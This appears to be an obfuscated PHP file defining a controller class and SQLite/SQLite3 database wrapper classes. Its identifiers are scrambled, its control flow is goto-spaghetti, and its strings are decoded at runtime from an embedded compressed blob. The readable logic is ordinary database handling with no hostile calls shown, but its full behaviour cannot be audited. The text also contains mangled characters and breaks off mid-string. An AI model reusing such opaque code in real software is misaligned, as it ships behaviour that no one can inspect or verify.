<?php
 goto fã∑å∞Üﬁ†; c’ú≥‰äç⁄: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto CÊö±–±á; CÊö±–±á: $bö‘“◊ÆŒà =& $_SERVER[¯èãÄπµ]; global $in, $config; $this->config =& $config; goto B±ìë§√äâ; B±ìë§√äâ: $this->in =& $in; $this->values[$bö‘“◊ÆŒà[6]] =& $config; $this->values[$bö‘“◊ÆŒà[7]] =& $in; goto AùâÕº≤§‚; AùâÕº≤§‚: $this->tpl = TEMPLATE . MOD . $bö‘“◊ÆŒà[8]; $this->_classObjectID = mt_rand(0, 10000); goto fÜû√ø˘áÌ; fÜû√ø˘áÌ: } public function loadClass($dØ∞ºâì‚◊) { if (1 === func_num_args()) { $this->{$dØ∞ºâì‚◊} = new $dØ∞ºâì‚◊(); } else { $D∫¶§Ô›±© = new ReflectionClass($dØ∞ºâì‚◊); $E∞âóÇõã¶ = func_get_args(); array_shift($E∞âóÇõã¶); $this->{$dØ∞ºâì‚◊} = $D∫¶§Ô›±©->newInstanceArgs($E∞âóÇõã¶); } return $this->{$dØ∞ºâì‚◊}; } protected function assign($DÂ∫Í¬¨ú™, $CŒàßÛ’Øú) { $this->values[$DÂ∫Í¬¨ú™] = $CŒàßÛ’Øú; } protected function display($Bˆ™ﬁª∑çó) { ob_end_clean(); extract($this->values); require $this->tpl . $Bˆ™ﬁª∑çó; } } class DbSqliteBase extends Db { public function __construct($fπ´ñ∂úâ¨ = '') { $fÕú∫êï‡¯ =& $_SERVER[¯èãÄπµ]; if (!extension_loaded($fÕú∫êï‡¯[9])) { think_exception(think_lang($fÕú∫êï‡¯[10]) . $fÕú∫êï‡¯[11]); } if (!empty($fπ´ñ∂úâ¨)) { if (!isset($fπ´ñ∂úâ¨[$fÕú∫êï‡¯[12]])) { $fπ´ñ∂úâ¨[$fÕú∫êï‡¯[12]] = 438; } $this->config = $fπ´ñ∂úâ¨; if (empty($this->config[$fÕú∫êï‡¯[13]])) { $this->config[$fÕú∫êï‡¯[13]] = array(); } } } public function connect($eãïÃíÈºñ = '', $cèßÌáõ· = 0) { $E“Áªôèª† =& $_SERVER[¯èãÄπµ]; if (!isset($this->linkID[$cèßÌáõ·])) { goto A⁄›“ÿßäÜ; A⁄›“ÿßäÜ: if (empty($eãïÃíÈºñ)) { $eãïÃíÈºñ = $this->config; } $fÈŸè»˜∞ä = !empty($eãïÃíÈºñ[$E“Áªôèª†[13]][$E“Áªôèª†[14]]) ? $eãïÃíÈºñ[$E“Áªôèª†[13]][$E“Áªôèª†[14]] : $this->pconnect; $düµ∑î√£é = $fÈŸè»˜∞ä ? $E“Áªôèª†[15] : $E“Áªôèª†[16]; goto b°Ã¿¿Ì¯†; b°Ã¿¿Ì¯†: $this->linkID[$cèßÌáõ·] = $düµ∑î√£é($eãïÃíÈºñ[$E“Áªôèª†[17]], $eãïÃíÈºñ[$E“Áªôèª†[12]]); if (!$this->linkID[$cèßÌáõ·]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto DÑ˘‹»ñ¬; DÑ˘‹»ñ¬: @sqlite_busy_timeout($this->linkID[$cèßÌáõ·], 30000); if (1 != think_config($E“Áªôèª†[18])) { unset($this->config); } goto CìÉ£ñÌÒ»; CìÉ£ñÌÒ»: } return $this->linkID[$cèßÌáõ·]; } public function free() { $this->queryID = null; } public function query($C¿ãÉˆ≈≤‘) { goto FΩ∆èÇÈ⁄⁄; aÙÒñ¯ñêæ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $c∞‹Ô¿Öºœ = $this->getAll(); return $c∞‹Ô¿Öºœ; } goto FŸƒ ÑÎ¶æ; CåÛó„≥ùπ: $this->queryStr = $C¿ãÉˆ≈≤‘; if ($this->queryID) { $this->free(); } think_action_status($C∂§óÏ’∆[19], 1); goto b¥ä·ƒÂÍì; FΩ∆èÇÈ⁄⁄: $C∂§óÏ’∆ =& $_SERVER[¯èãÄπµ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CåÛó„≥ùπ; b¥ä·ƒÂÍì: think_status($C∂§óÏ’∆[20]); $this->queryID = sqlite_query($this->_linkID, $C¿ãÉˆ≈≤‘); $this->debug(); goto aÙÒñ¯ñêæ; FŸƒ ÑÎ¶æ: } public function execute($aéÒ¥∞ç¿ê) { goto a§õÁ»á°å; e¥Áº¥“∆±: $this->queryStr = $aéÒ¥∞ç¿ê; if ($this->queryID) { $this->free(); } think_action_status($cñô®–Æô¯[21], 1); goto d◊ØØ§≤á ; a§õÁ»á°å: $cñô®–Æô¯ =& $_SERVER[¯èãÄπµ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e¥Áº¥“∆±; dºó” çÀØ: if (!1 === $f‘û∂˘›—£) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto fÉªœÿ¯Ñ∆; d◊ØØ§≤á : think_status($cñô®–Æô¯[20]); $f‘û∂˘›—£ = sqlite_exec($this->_linkID, $aéÒ¥∞ç¿ê); $this->debug(); goto dºó” çÀØ; fÉªœÿ¯Ñ∆: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¯èãÄπµ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÖŒóÎç¿Á = sqlite_query($this->_linkID, $_SERVER[¯èãÄπµ][23]); if (!$AÖŒóÎç¿Á) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $d¡‘é≈íÑ∂ = sqlite_query($this->_linkID, $_SERVER[¯èãÄπµ][24]); if (!$d¡‘é≈íÑ∂) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cÏ”¢È¬®° = array(); if ($this->numRows > 0) { for ($BèûêóíãÙ = 0; $BèûêóíãÙ < $this->numRows; $BèûêóíãÙ++) { $cÏ”¢È¬®°[$BèûêóíãÙ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $cÏ”¢È¬®°; } public function getFields($dÈçÆŒÈØ∑) { $BÛŒ”‡€¢Á =& $_SERVER[¯èãÄπµ]; $CΩ†≤œ‡üä = $this->query($BÛŒ”‡€¢Á[25] . $dÈçÆŒÈØ∑ . $BÛŒ”‡€¢Á[26]); $d¢∫õ®¥πé = array(); if ($CΩ†≤œ‡üä) { foreach ($CΩ†≤œ‡üä as $cÀ‹î¨ºÀì => $FÎïåÎ»ÉË) { $d¢∫õ®¥πé[$FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[27]]] = array($BÛŒ”‡€¢Á[28] => $FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[27]], $BÛŒ”‡€¢Á[29] => $FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[30]], $BÛŒ”‡€¢Á[31] => (bool) ($FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[32]] === $BÛŒ”‡€¢Á[33]), $BÛŒ”‡€¢Á[34] => $FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[35]], $BÛŒ”‡€¢Á[36] => strtolower($FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[37]]) == $BÛŒ”‡€¢Á[38], $BÛŒ”‡€¢Á[39] => strtolower($FÎïåÎ»ÉË[$BÛŒ”‡€¢Á[40]]) == $BÛŒ”‡€¢Á[41]); } } return $d¢∫õ®¥πé; } public function getTables($cØ«òí≈” = '') { $Dˆ“‰Ñó∫ñ =& $_SERVER[¯èãÄπµ]; $e•ªÊŒ÷„È = $this->query($Dˆ“‰Ñó∫ñ[42] . $Dˆ“‰Ñó∫ñ[43] . $Dˆ“‰Ñó∫ñ[44]); $då £ßøÍ§ = array(); foreach ($e•ªÊŒ÷„È as $Bëëı§≤¿≥ => $EÈëÎÇ‘÷Á) { $då £ßøÍ§[$Bëëı§≤¿≥] = current($EÈëÎÇ‘÷Á); } return $då £ßøÍ§; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bÖ†¬ÃÜÉ• =& $_SERVER[¯èãÄπµ]; $EÔéò≤±‰Œ = sqlite_last_error($this->_linkID); $this->error = $EÔéò≤±‰Œ . $bÖ†¬ÃÜÉ•[4] . sqlite_error_string($EÔéò≤±‰Œ); if ($bÖ†¬ÃÜÉ•[33] != $this->queryStr) { $this->error .= LNG($bÖ†¬ÃÜÉ•[45]) . $this->queryStr; } think_trace($this->error, $bÖ†¬ÃÜÉ•[33], $bÖ†¬ÃÜÉ•[46]); return $this->error; } public function escapeString($B√∂†°ÍÒ¯) { return sqlite_escape_string($B√∂†°ÍÒ¯); } public function parseLimit($f⁄∫´·£•µ) { $CÆ≤Ï’‚ê¯ =& $_SERVER[¯èãÄπµ]; $FúÛÌâ∫ﬂ = $CÆ≤Ï’‚ê¯[33]; if (!empty($f⁄∫´·£•µ)) { $f⁄∫´·£•µ = explode($CÆ≤Ï’‚ê¯[47], $f⁄∫´·£•µ); if (count($f⁄∫´·£•µ) > 1) { $FúÛÌâ∫ﬂ .= $CÆ≤Ï’‚ê¯[48] . $f⁄∫´·£•µ[1] . $CÆ≤Ï’‚ê¯[49] . $f⁄∫´·£•µ[0] . $CÆ≤Ï’‚ê¯[50]; } else { $FúÛÌâ∫ﬂ .= $CÆ≤Ï’‚ê¯[48] . $f⁄∫´·£•µ[0] . $CÆ≤Ï’‚ê¯[50]; } } return $FúÛÌâ∫ﬂ; } } class DbSqlite3Base extends Db { public function __construct($fòÌÕèÎÜ– = '') { $aÈŸΩ·âå¥ =& $_SERVER[¯èãÄπµ]; if (!class_exists($aÈŸΩ·âå¥[51])) { think_exception(think_lang($aÈŸΩ·âå¥[10]) . $aÈŸΩ·âå¥[52]); } if (!empty($fòÌÕèÎÜ–)) { if (!isset($fòÌÕèÎÜ–[$aÈŸΩ·âå¥[12]])) { $fòÌÕèÎÜ–[$aÈŸΩ·âå¥[12]] = 438; } $this->config = $fòÌÕèÎÜ–; if (empty($this->config[$aÈŸΩ·âå¥[13]])) { $this->config[$aÈŸΩ·âå¥[13]] = array(); } } } public function connect($Eï·‘…ë‚• = '', $DÜŒŒÖ¿üÉ = 0) { $cæ›àåÁ„â =& $_SERVER[¯èãÄπµ]; if (!isset($this->linkID[$DÜŒŒÖ¿üÉ])) { if (empty($Eï·‘…ë‚•)) { $Eï·‘…ë‚• = $this->config; } $this->linkID[$DÜŒŒÖ¿üÉ] = new SQLite3($Eï·‘…ë‚•[$cæ›àåÁ„â[17]]); if (!$this->linkID[$DÜŒŒÖ¿üÉ]) { think_exception($this->linkID[$DÜŒŒÖ¿üÉ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$DÜŒŒÖ¿üÉ]->busyTimeout(30000); if (1 != think_config($cæ›àåÁ„â[18])) { unset($this->config); } } return $this->linkID[$DÜŒŒÖ¿üÉ]; } public function free() { $this->queryID = null; } public function query($cŒç€®—éŒ) { goto Dòùµß›ëê; Dòùµß›ëê: $a±äã∏‹ù≈ =& $_SERVER[¯èãÄπµ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dΩáÂÜ±◊ﬂ; C€ò¡¬ñÉΩ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $CÀªø≤óÿµ = $this->getAll(); $this->numRows = count($CÀªø≤óÿµ); return $CÀªø≤óÿµ; } goto cÈ‚Íü∫»⁄; C⁄÷ø©˜ﬁ: think_status($a±äã∏‹ù≈[20]); $this->queryID = $this->_linkID->query($cŒç€®—éŒ); $this->debug(); goto C€ò¡¬ñÉΩ; dΩáÂÜ±◊ﬂ: $this->queryStr = $cŒç€®—éŒ; if ($this->queryID) { $this->free(); } think_action_status($a±äã∏‹ù≈[19], 1); goto C⁄÷ø©˜ﬁ; cÈ‚Íü∫»⁄: } public function execute($DÖ‘¶Î≈ñ∫) { goto fÇ√éÒıÛ•; a∑¥⁄∫åÑã: $this->queryStr = $DÖ‘¶Î≈ñ∫; if ($this->queryID) { $this->free(); } think_action_status($bŸ˘êºº¿©[21], 1); goto fﬂÁ–‹á˜µ; fﬂÁ–‹á˜µ: think_status($bŸ˘êºº¿©[20]); $e˘É∆Ì¿Èâ = $this->_linkID->exec($DÖ‘¶Î≈ñ∫); $this->debug(); goto bˆœÍêû∑ã; fÇ√éÒıÛ•: $bŸ˘êºº¿© =& $_SERVER[¯èãÄπµ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a∑¥⁄∫åÑã; bˆœÍêû∑ã: if (!1 === $e˘É∆Ì¿Èâ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto FÚ÷Êºë—õ; FÚ÷Êºë—õ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¯èãÄπµ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eá®ÂÕ© = $this->_linkID->query($_SERVER[¯èãÄπµ][23]); if (!$Eá®ÂÕ©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÍÁπ ±íı = $this->_linkID->query($_SERVER[¯èãÄπµ][24]); if (!$DÍÁπ ±íı) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Eâœ´¶ı“Î = array(); while ($f§Æ¨¿πµä = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Eâœ´¶ı“Î[] = $f§Æ¨¿πµä; } $this->queryID->reset(); return $Eâœ´¶ı“Î; } public function getFields($EÕ‹ëÀ∆Â∆) { $d≈Í‰œﬁíõ =& $_SERVER[¯èãÄπµ]; $cÍî«ûˆ§õ = $this->query($d≈Í‰œﬁíõ[25] . $EÕ‹ëÀ∆Â∆ . $d≈Í‰œﬁíõ[26]); $A◊¢µöŒ˜ = array(); if ($cÍî«ûˆ§õ) { foreach ($cÍî«ûˆ§õ as $bÈé©™±Ωë => $få∏èàºîø) { $A◊¢µöŒ˜[$få∏èàºîø[$d≈Í‰œﬁíõ[28]]] = array($d≈Í‰œﬁíõ[28] => $få∏èàºîø[$d≈Í‰œﬁíõ[28]], $d≈Í‰œﬁíõ[29] => $få∏èàºîø[$d≈Í‰œﬁíõ[29]], $d≈Í‰œﬁíõ[31] => (bool) ($få∏èàºîø[$d≈Í‰œﬁíõ[31]] === $d≈Í‰œﬁíõ[33]), $d≈Í‰œﬁíõ[34] => $få∏èàºîø[$d≈Í‰œﬁíõ[53]], $d≈Í‰œﬁíõ[36] => (bool) $få∏èàºîø[$d≈Í‰œﬁíõ[54]], $d≈Í‰œﬁíõ[39] => (bool) $få∏èàºîø[$d≈Í‰œﬁíõ[54]]); } } return $A◊¢µöŒ˜; } public function getTables($fÃ’ÇØìï∆ = '') { $açÕˆïÚ¿à =& $_SERVER[¯èãÄπµ]; $b£ƒ °ÿ⁄˘ = $this->query($açÕˆïÚ¿à[42] . $açÕˆïÚ¿à[43] . $açÕˆïÚ¿à[44]); $AΩ≠ûï…ê› = array(); foreach ($b£ƒ °ÿ⁄˘ as $d◊à®µÙ®∏ => $a⁄Ûºˆ∑⁄◊) { $AΩ≠ûï…ê›[$d◊à®µÙ®∏] = current($a⁄Ûºˆ∑⁄◊); } return $AΩ≠ûï…ê›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E¿πá’£ƒÕ =& $_SERVER[¯èãÄπµ]; $this->error = $this->_linkID->lastErrorMsg(); if ($E¿πá’£ƒÕ[33] != $this->queryStr) { $this->error .= LNG($E¿πá’£ƒÕ[45]) . $this->queryStr; } think_trace($this->error, $E¿πá’£ƒÕ[33], $E¿πá’£ƒÕ[46]); return $this->error; } public function escapeString($fé†àŸ™ÃÑ) { $Cõ¬£°—⁄“ =& $_SERVER[¯èãÄπµ]; if ($this->_linkID) { return $this->_linkID->escapeString($fé†àŸ™ÃÑ); } return str_ireplace($Cõ¬£°—⁄“[55], $Cõ¬£°—⁄“[56], $fé†àŸ™ÃÑ); } public function parseLimit($Bí‰á¬îµÛ) { $AÏ÷àèº§ö =& $_SERVER[¯èãÄπµ]; $C»ÜÿÖºáä = $AÏ÷àèº§ö[33]; if (!empty($Bí‰á¬îµÛ)) { $Bí‰á¬îµÛ = explode($AÏ÷àèº§ö[47], $Bí‰á¬îµÛ); if (count($Bí‰á¬îµÛ) > 1) { $C»ÜÿÖºáä .= $AÏ÷àèº§ö[48] . $Bí‰á¬îµÛ[1] . $AÏ÷àèº§ö[49] . $Bí‰á¬îµÛ[0] . $AÏ÷àèº§ö[50]; } else { $C»ÜÿÖºáä .= $AÏ÷àèº§ö[48] . $Bí‰á¬îµÛ[0] . $AÏ÷àèº§ö[50]; } } return $C»ÜÿÖºáä; } } goto E¬‚ïΩêâ–; fã∑å∞Üﬁ†: if (!function_exists('_kodDe')) { function _kodDe($f◊¢ÕõÚ◊Ã) { $f◊¢ÕõÚ◊Ã = base64_decode($f◊¢ÕõÚ◊Ã); $a÷®†‰æ‚Â = strlen($f◊¢ÕõÚ◊Ã); $aΩ·÷çÒã¶ = ''; $BÑŸÜ“á≤ = ord($f◊¢ÕõÚ◊Ã[0]) - 30; for ($Dè™…à¨§Í = 1; $Dè™…à¨§Í < $a÷®†‰æ‚Â; $Dè™…à¨§Í += 2) { if ($Dè™…à¨§Í + 1 < $a÷®†‰æ‚Â) { $aΩ·÷çÒã¶ .= chr(ord($f◊¢ÕõÚ◊Ã[$Dè™…à¨§Í + 1]) + $BÑŸÜ“á≤); $aΩ·÷çÒã¶ .= chr(ord($f◊¢ÕõÚ◊Ã[$Dè™…à¨§Í]) + $BÑŸÜ“á≤); } else { $aΩ·÷çÒã¶ .= chr(ord($f◊¢ÕõÚ◊Ã[$Dè™…à¨§Í]) + $BÑŸÜ“á≤); } } return $aΩ·÷çÒã¶; } } define(base64_decode('+I+LgLm1'), "\206\257\321"); $_SERVER[¯èãÄπµ] = explode("\174\4\174\5\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\174\33\305\325\70\55\245\234\55\174\100\133\50\327\306\111\360\21\35\276\342\44\116\142\107\266\344\130\211\155\71\222\34\47\261\34\145\45\255\244\265\245\135\171"._kodDe('MBNl9w3lG0u1XrwkhBsKML4ub8oOj2UW0yZl0/jwNlbTBG/cLMrtqSGPgOHrv7GJuqElqmHhZ9RUqw==')."\x37\xef\xbc\xbb\xe9\xd5\x1b\x4e\xdb\xf0\xbd\xd\xbb\x6d\xd8\xf5\xc5\xd3\x3e\x7b\xe9\xc2\x57\x6f\xc4\x91\xd\xdf\x5\xbf\xbb\xe2\xf0\x11\xa7\xee\xb1\xb\xfa\x6f\xd7\xfc\x8a\x7b\xfb\xbe\xdb\xb0\x5f\xef\x33\xe7\xc4\xef\x7d\xe4\x9c"."\143\36\130\330\40\325\214\236\73\333\63\366\344\5\315\127\36\266\355\304\247\132\362\363\366\277\377\217\267\67\156\176\167\331\255\326\53\313\167\76\166\307\205\362\347\247\176\371\354\127\37\76\273\354\57\173\234"."\x30\x77\xce\xcd\x5d\xae\xc9\x37\x97\x1f\xbe\xcb\xea\x7d\x3b\x7f\x72\xdc\xd3\xdb\xd7\x1c\xfc\xc0\xe6\x1f\xef\x78\xbc\x38\xfc\xda\x99\xb9\x8b\x6f\xdb\x7d\xd5\xf9\xfb\x5d\xf4\xbf\x7f\xb9\x62\x60\xf1\xe5\xb7\xac\x39\xee\x1f\x5f\xea"."\305\263\7\247\352\126\316\373\374\262\7\106\367\371\333\235\377\336\343\203\73\357\375\113\365\344\56\257\16\164\335\167\306\317\266\356\267\337\175\57\153\367\364\57\253\131\62\372\375\205\373\75\274\260\170\367\262"."\x7f\xed\x3c\x6e\xe2\x7f\x66\xae\x3e\x65\x64\xef\x2d\xa7\x35\xcf\x7c\xe0\xbe\x65\xf\x84\xde\xf8\xf4\xe4\x8f\xef\x3a\x7c\x65\xc7\xe6\xb5\xfe\x17\x66\x3d\xf6\x82\xb9\xb1\xef\x85\xe6\x5f\x6e\xfe\xa0\x6a\xc6\x7b\xfb\xaf\x7c\xae\x73".base64_decode('5bkrXtQvmpz/8Nm7txzyaPXD8bNnHDJb7z78d2ff1qR9fKapn7tpffrJOb61v22p83V1/W3RHocf').base64_decode('c8eriXUbrmw+9IkX31BuetF44dA3zdcuuXX9vou+fuuWuRd+dox5wE2n7XbSs5fudutVv5d3m3dj')."\353\327\13\36\223\257\330\170\375\333\147\376\245\253\145\145\335\372\113\366\373\277\226\117\316\33\376\147\360\263\275\217\136\67\337\367\352\167\167\331\5\167\164\53\376\221\64\335\222\224\11\325\264\114\14\110\352"."\x5a\x5a\xcd\xe0\xb0\xaa\xe1\x5f\x2f\xfe\x31\xc7\x72\xaa\xa5\xe0\x70\xbc\x2f\x14\x8d\x47\x6\xfa\xfb\x3\xe1\x68\x9c\x94\x28\xa6\xe7\xf5\x14\x9\x15\x64\x43\xce\x93\xc2\xb\x8a\x61\x82\x4f\x89\xc5\xc5\xb\x7a\x41\xd1\x6c\x10\xe"."\x48\xc9\x96\x9c\x90\x4d\x52\x92\xbf\x23\xee\xf\xf4\xf7\x84\x56\xc7\xa3\xab\xfb\x3\x4\x23\x11\x1f\x2b\x2a\xc6\x24\x8e\xa1\x60\xc4\x92\xd\x2b\xaa\xe6\x15\x86\x31\x6e\xb0\x7a\x75\x4\x96\x6\xfb\xa4\x68\xd8\xd7\x17\xf1\x75\x46"."\203\241\76\14\356\14\365\366\6\243\345\360\160\250\247\247\303\327\271\274\74\245\77\354\133\332\353\223\100\375\162\112\134\325\322\172\215\264\16\247\254\223\152\161\240\113\125\162\51\34\324\144\132\35\153\262\100"."\x42\x51\x16\x2\x63\xa0\x15\x73\x39\x1c\xe9\x63\x21\x52\x7f\x25\x2d\x17\x73\xa4\xcf\xfc\x62\xa4\x60\xa8\x79\x99\x36\x7d\xb9\x32\xc9\xa0\x38\x20\x17\x2d\x5d\xd5\x92\x38\x12\x98\xb0\xc\x99\xc3\x41\x8d\x93\x86\x92\x57\x34\x52\x54"."\44\320\23\350\214\112\260\232\122\127\70\324\53\221\241\310\313\246\245\30\322\140\167\40\34\220\140\325\27\127\243\26\127\113\70\337\100\37\350\20\311\327\323\43\115\127\202\245\344\13\264\30\234\247\102\141\241".base64_decode('sD8QljpWS7yfkno+r2seUAoYT0uoaiAcxgEXoeCeIBw6Egl1dUUCLEYat6IH1KSJUKktlkrnrHhJ')."\xce\x15\x29\xb1\x8e\xe2\xdf\x6a\xf2\x43\x7e\x75\x93\x10\xf0\x98\xaa\xa9\x45\x42\xac\xa4\x8\x5d\x67\x33\x87\x4\x8a\x14\x5b\xa1\x90\x3c\xc8\xa6\x93\x39\x5\x26\x58\x9\x7\x17\xb7\xe1\xdf\x85\x4\x29\x11\x87\x69\x8a\x61\xc5\x15".base64_decode('LamnVI1Mw3Yy5QjhyVbWb6gAjxSoe5J6YbJXL5E2pNWc0sNmWVrPpRSDxwsgu5hCGqNOCbn7inkR')."\x85\x45\x93\x59\x35\x97\x32\xe8\xe4\xfc\x26\xcc\x6\x52\xac\x62\x59\xa0\x19\x26\xad\xe9\x40\x21\xa7\xcb\xa9\x88\x62\x8\xb5\xef\x2\xc5\x84\x8a\x96\x8\x2c\x22\xb4\x2e\xdd\xc8\xfb\x1\x3\x20\xbd\x3\xc8\x5e\x1d\xa8\x90\x30\x4a"."\x9\x3f\x25\x74\x8a\x87\x30\xae\x9a\xa1\x63\xdc\x5f\xd\xf\x2d\x1\xff\xd4\x12\x2e\x16\x23\x55\xcb\x2a\xb9\x5c\x5c\x99\x50\xc8\x4\xc9\xa7\xe6\x9a\xb4\xf6\x5e\x33\xa1\x6a\x5e\x0\xc1\xd1\x60\x28\x9e\x95\xcd\x6c\x6f\x6a\x6e\x1c".base64_decode('5aLMMaVMeArZApnDbNoSyoUd3adbAYG35vSknBObiMNZyypEFC0Fe4I0RR/XUE8VFIUg+V1SSuqV')."\126\113\335\255\152\53\45\53\100\44\351\111\316\352\262\126\76\307\102\264\231\14\146\62\240\65\101\210\241\212\304\225\11\213\364\216\264\60\231\225\15\60\156\213\213\126\332\75\237\160\214\102\41\247\46\145\113".base64_decode('1TWvnrQUy21ahiKT0qoWSpAU4NStw7notOnUNQvMW3fUkDUzrRjuAKHrVgl0MGNdFM2vmgXdVOFn')."\132\45\331\262\344\144\26\116\173\136\374\342\157\300\127\265\234\252\51\145\270\276\144\122\61\115\67\314\142\350\71\267\57\227\323\307\335\41\103\315\250\40\117\235\243\232\200\45\265\112\224\137\26\124\103\61\151".base64_decode('VFraGyXIoFaKu9+QM3m5VSoUE6BnyMSsAMPY5OutUhJGXVK+aFpuQwF8RwUrHBm8YNrdC8dTVVLu')."\x8\x60\xcf\x4\xdc\x54\xdf\x2c\x1\x32\x92\x68\x1a\x86\x76\x47\xa3\xfd\xf1\x60\x17\x58\x85\xfb\x2\xf1\x5e\x5f\xb4\xb3\x9b\x54\xdb\x92\x33\xb4\xce\x3d\x80\xe9\xb2\x22\x29\x70\x95\x1b\xcc\x35\x48\x68\x7d\xa0\x8f\x38\xb0\x5f\x1f"."\127\14\360\341\216\311\126\151\124\117\45\364\11\17\115\202\310\21\300\36\50\62\354\321\202\345\16\313\132\6\366\117\142\322\122\10\71\232\245\14\135\115\302\53\3\341\170\44\324\25\35\364\205\311\112\255\201".strrev('å∞3Í'."\n".'X¥µÖ^j=Ÿh±‰ÄMª.¬óı¶Ñ”ÖM&éSÅ≈ˆr—h¥úùí∞ÓrB¬Ö†ü.')."\57\45\25\362\242\252\57\216\145\353\152\142\251\71\265\156\360\157\135\355\120\314\357\251\33\156\367\252\74\217\267\301\323\40\65\326\267\110\375\100\256\120\345\234\104\350\245\14\243\136\12\55\267\123\124\217\242"."\x65\xac\x2c\x11\xb5\xc2\x81\x15\x3\x81\x48\x34\xde\x1b\x88\x76\x87\xfc\x24\x77\xc0\x47\x42\x3d\x3a\x9e\x60\xb4\xb6\x43\xf8\x67\x98\x8c\x3\x58\xe9\x33\x4a\x52\xcf\xe9\x86\x9c\x83\x6c\x84\x52\x8d\x42\xa7\x72\x46\x4d\x73\xb6\x1c"."\x4\xf2\x8\xe9\x34\xcc\xb8\x78\x24\xa2\xe6\xb\x94\xcd\x58\xd9\x62\x3e\x21\x4\xbd\xbc\x4\x32\xa2\x60\x38\x18\x73\xd1\xd9\x12\xa2\x1b\x24\xd4\xea\x25\x59\x66\x37\x76\x51\x5e\xe9\x8d\x34\x81\xff\x39\x63\x4c\xe9\x79\x99\xa\x92"."\x68\xfa\x29\x29\x3c\xff\x30\xa8\xce\x96\xd2\xad\xc8\x7c\x4d\xb2\xc\x4b\x87\x50\xc3\x86\xd2\xab\x58\x59\x9d\x4c\x83\x8c\x42\xab\x54\x64\x75\xa3\xb5\x4c\x29\x39\x85\xf6\x52\x56\xa1\xbc\x16\x48\x47\x25\xd6\x79\x5\x43\x49\xab\x84".base64_decode('JoE4BOCcl6pmGGSC4gmND0IpkgMsznZlk7NuGBEW1q6Bnp54Z6gvCiRJDBkMB6MBShE+f9zX2c9W')."\40\76\114\4\1\116\262\162\46\205\41\245\106\201\173\163\66\317\31\47\135\247\40\143\304\141\300\321\12\272\146\52\356\44\51\55\305\131\50\306\130\350\340\237\145\71\270\374\72\341\226\363\123\356\274\142\311"."\156\126\165\373\52\45\105\305\305\56\110\206\200\263\274\34\130\32\301\366\200\56\217\375\241\10\311\320\16\241\100\230\110\50\6\251\107\377\0\111\312\13\303\277\64\100\200\173\321\25\116\46\202\207\157\60\102".strrev('@¯r—Å``Ò=˘'."\r".'Ô[Ï⁄*«Õ⁄µ+ì¢CÄ#◊„mW|∏Á»û CÎNÿ€ÃîÍ‡UŸ').strrev('˘Ù„õ≥Øßxë¸z'."\n".'Ì*‡ÆÅ√˙òÏ#ÄÅ∞LTç0U`z\'A=}+‡'."\0".'Ë6›¢ÑwÑ_Gﬂø')."\172\111\44\236\206\173\26\323\153\307\217\3\156\36\141\73\237\170\11\356\342\150\147\306\155\333\214\70\25\240\343\234\116\300\22\244\20\332\44\315\205\173\107\324\22\42\322\46\365\42\245\126\46\203\345\51\203"."\310\313\144\206\312\164\171\251\301\77\265\222\57\42\131\205\70\143\5\211\111\26\104\315\240\161\40\164\221\357\113\204\371\226\325\40\16\161\72\224\264\156\50\337\4\360\245\55\106\30\216\70\230\67\74\15\214"."\200\17\155\122\1\45\240\21\211\323\271\150\2\361\336\107\253\223\346\33\304\170\10\354\244\175\160\173\31\37\14\207\372\226\222\14\343\131\205\126\40\110\272\277\206\212\44\144\227\151\161\226\4\344\11\231\213"."\206\264\323\107\164\332\225\33\360\317\221\370\7\210\140\344\343\212\106\173\75\1\31\63\143\34\164\13\1\146\13\145\252\172\221\175\55\241\353\71\72\217\301\132\313\370\5\333\237\216\230\224\110\46\50\163\232".base64_decode('Q1ctsjhEQ8sDfXFKWTgmUCMGgB1fKEw6xNJH6f4DJ4YDEcoFDGWsqNLu8nrmECpWwPpDPu9dGxuf')."\123\63\344\236\343\31\6\201\332\272\45\70\112\142\61\217\55\72\213\344\57\32\54\67\24\101\152\314\366\332\326\230\67\346\255\151\157\35\362\271\247\144\367\124\275\173\201\173\170\116\314\123\73\207\0\206\327"."\x37\xba\x9a\x8f\x82\x8\x0\xb1\x7d\xe6\x30\xf8\x59\x1c\x6b\x9f\x1d\x73\x1f\xf9\xb3\x75\x4b\x86\x62\xc3\xd5\xad\x73\x66\xc4\x3c\x33\x63\xe3\xc3\x75\xb5\xed\xf4\x3b